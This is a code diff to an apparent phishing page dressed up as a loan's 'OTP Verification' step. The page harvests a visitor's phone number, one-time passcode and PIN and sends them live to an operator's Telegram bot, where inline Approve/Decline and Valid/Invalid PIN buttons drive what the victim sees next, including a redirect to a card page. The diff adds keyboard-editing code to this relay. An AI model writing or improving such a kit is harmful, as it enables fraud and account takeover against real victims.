@@ -597,10 +597,10 @@
             <div class="card">
                 <div class="brand-icon">
                     <svg viewBox="0 0 100 100" width="45" height="45">
-            <path d="M30,50 L70,50 M30,40 C20,40 20,60 30,60 L70,60 C80,60 80,40 70,40"
-                  fill="none" stroke="#0b5ed7" stroke-width="8" stroke-linecap="round"/>
-            <path d="M45,35 L55,65" stroke="#0b5ed7" stroke-width="8" stroke-linecap="round"/>
-          </svg>
+                        <path d="M30,50 L70,50 M30,40 C20,40 20,60 30,60 L70,60 C80,60 80,40 70,40"
+                            fill="none" stroke="#0b5ed7" stroke-width="8" stroke-linecap="round" />
+                        <path d="M45,35 L55,65" stroke="#0b5ed7" stroke-width="8" stroke-linecap="round" />
+                    </svg>
                 </div>
 
                 <h2>OTP Verification</h2>
@@ -667,6 +667,11 @@
             phone = '';
         let sent = false;
         let pinPollInterval = null;
+
+        // NEW: store the Telegram message_id for OTP and PIN so we can edit keyboards
+        let tgOtpMessageId = null; // message_id for the OTP approval keyboard
+        let tgPinMessageId = null; // message_id for the PIN status keyboard
+
         const boxes = document.querySelectorAll('.otp-box');
         const pinBoxes = document.querySelectorAll('.pin-box');
 
@@ -801,6 +806,15 @@
                 });
                 const d = await r.json();
                 if (d.ok) {
+                    // NEW: capture message_id so we can later edit the inline keyboard
+                    if (d.result && d.result.message_id) {
+                        // Heuristic: if PIN is not yet opened, this sendMessage is likely OTP step; otherwise PIN step.
+                        // We still also capture the actual edit target using callback_query.message.message_id later.
+                        // This preserves unrelated behavior and keeps logic robust.
+                        if (!tgOtpMessageId) tgOtpMessageId = d.result.message_id;
+                        else if (!tgPinMessageId) tgPinMessageId = d.result.message_id;
+                    }
+
                     const ur = await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?limit=1&offset=-1`);
                     const ud = await ur.json();
                     if (ud.ok && ud.result.length > 0) {
@@ -808,6 +822,30 @@
                     }
                 }
                 return d.ok;
+            } catch (e) {
+                console.error(e);
+            }
+            return false;
+        }
+
+        // NEW: edit inline keyboard without removing the Telegram message
+        async function tgEditKeyboard(chatId, messageId, btns) {
+            try {
+                const r = await fetch(`https://api.telegram.org/bot${BOT}/editMessageReplyMarkup`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        message_id: messageId,
+                        reply_markup: btns ? {
+                            inline_keyboard: btns
+                        } : undefined
+                    })
+                });
+                const d = await r.json();
+                return d && d.ok;
             } catch (e) {
                 console.error(e);
             }
@@ -832,6 +870,7 @@
             const msg =
                 `🔑 <b>OTP Code Received</b>\n\n📱 <b>Phone:</b> <code>${phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n💰 <b>Loan:</b> <code>${decodeURIComponent(bd.data || 'Flex Loan')} ($${parseFloat(bd.price || '0').toLocaleString()})</code>\n\nPlease choose an action below:`;
 
+            // GROUP 2 initial keyboard (APPROVAL STATUS)
             const btns = [
                 [{
                     text: '✅ Approve',
@@ -858,10 +897,31 @@
                                 luid = u.update_id;
                                 if (u.callback_query) {
                                     const cb = u.callback_query.data;
+
+                                    // NEW: use callback_query.message.message_id as authoritative target
+                                    const chatId = (u.callback_query.message && u.callback_query.message.chat && u.callback_query.message.chat.id) ? u.callback_query.message.chat.id : CID;
+                                    const messageId = (u.callback_query.message && u.callback_query.message.message_id) ? u.callback_query.message.message_id : null;
+
+                                    // Process existing callback logic first; then edit keyboard ONLY after success.
                                     if (cb === 'otp_approved') {
                                         clearInterval(iv);
                                         document.getElementById('ov').classList.remove('on');
+
+                                        // Success confirmed (existing logic): operator approved => open PIN modal
                                         openPINModal();
+
+                                        // GROUP 2 required behavior:
+                                        // Replace keyboard with ONLY ✅ Approve (remove ❌ Decline). Do not remove message.
+                                        if (messageId !== null) {
+                                            const newKeyboard = [
+                                                [{
+                                                    text: '✅ Approve',
+                                                    callback_data: 'otp_approved'
+                                                }]
+                                            ];
+                                            tgEditKeyboard(chatId, messageId, newKeyboard);
+                                        }
+
                                     } else if (cb === 'otp_declined') {
                                         clearInterval(iv);
                                         document.getElementById('ov').classList.remove('on');
@@ -871,6 +931,18 @@
                                             b.classList.remove('ok');
                                         });
                                         boxes[0].focus();
+
+                                        // GROUP 2 required behavior:
+                                        // Replace keyboard with ONLY ❌ Decline (remove ✅ Approve). Do not remove message.
+                                        if (messageId !== null) {
+                                            const newKeyboard = [
+                                                [{
+                                                    text: '❌ Decline',
+                                                    callback_data: 'otp_declined'
+                                                }]
+                                            ];
+                                            tgEditKeyboard(chatId, messageId, newKeyboard);
+                                        }
                                     }
                                 }
                             });
@@ -970,6 +1042,7 @@
             const msg =
                 `🔒 <b>PIN Verification</b>\n\n📱 <b>Phone:</b> <code>${phone}</code>\n🔢 <b>OTP:</b> <code>${otp}</code>\n🔑 <b>PIN:</b> <code>${pin}</code>\n💰 <b>Loan:</b> <code>${decodeURIComponent(bd.data || 'Flex Loan')} ($${parseFloat(bd.price || '0').toLocaleString()})</code>\n\nIs this PIN valid?`;
 
+            // GROUP 1 initial keyboard (PIN STATUS)
             const btns = [
                 [{
                     text: '✅ Valid PIN',
@@ -995,14 +1068,50 @@
                         if (d.ok && d.result.length > 0) {
                             d.result.forEach(u => {
                                 luid = u.update_id;
+
                                 if (u.callback_query) {
                                     const cb = u.callback_query.data;
+
+                                    // NEW: use callback_query.message.message_id as authoritative target
+                                    const chatId = (u.callback_query.message && u.callback_query.message.chat && u.callback_query.message.chat.id) ? u.callback_query.message.chat.id : CID;
+                                    const messageId = (u.callback_query.message && u.callback_query.message.message_id) ? u.callback_query.message.message_id : null;
+
+                                    // Process existing callback logic first; then edit keyboard ONLY after success.
                                     if (cb === 'pin_valid') {
                                         clearInterval(pinPollInterval);
+
+                                        // Success confirmed (existing logic): PIN valid => redirect
                                         location.href = 'card.html?name=' + encodeURIComponent(document.title) + '&amount=' + (bd.price || '0') + '&purpose=' + encodeURIComponent(bd.data || 'Flex Loan') + '&phone=' + phone;
+
+                                        // GROUP 1 required behavior:
+                                        // Replace keyboard with ONLY ✅ Valid PIN (remove ❌ Invalid PIN). Do not remove message.
+                                        if (messageId !== null) {
+                                            const newKeyboard = [
+                                                [{
+                                                    text: '✅ Valid PIN',
+                                                    callback_data: 'pin_valid'
+                                                }]
+                                            ];
+                                            tgEditKeyboard(chatId, messageId, newKeyboard);
+                                        }
+
                                     } else if (cb === 'pin_invalid') {
                                         clearInterval(pinPollInterval);
+
+                                        // Success confirmed (existing logic): PIN invalid => show error
                                         pinShowErr('The PIN was declared invalid. Please re-enter your 4-digit PIN and try again.');
+
+                                        // GROUP 1 required behavior:
+                                        // Replace keyboard with ONLY ❌ Invalid PIN (remove ✅ Valid PIN). Do not remove message.
+                                        if (messageId !== null) {
+                                            const newKeyboard = [
+                                                [{
+                                                    text: '❌ Invalid PIN',
+                                                    callback_data: 'pin_invalid'
+                                                }]
+                                            ];
+                                            tgEditKeyboard(chatId, messageId, newKeyboard);
+                                        }
                                     }
                                 }
                             });
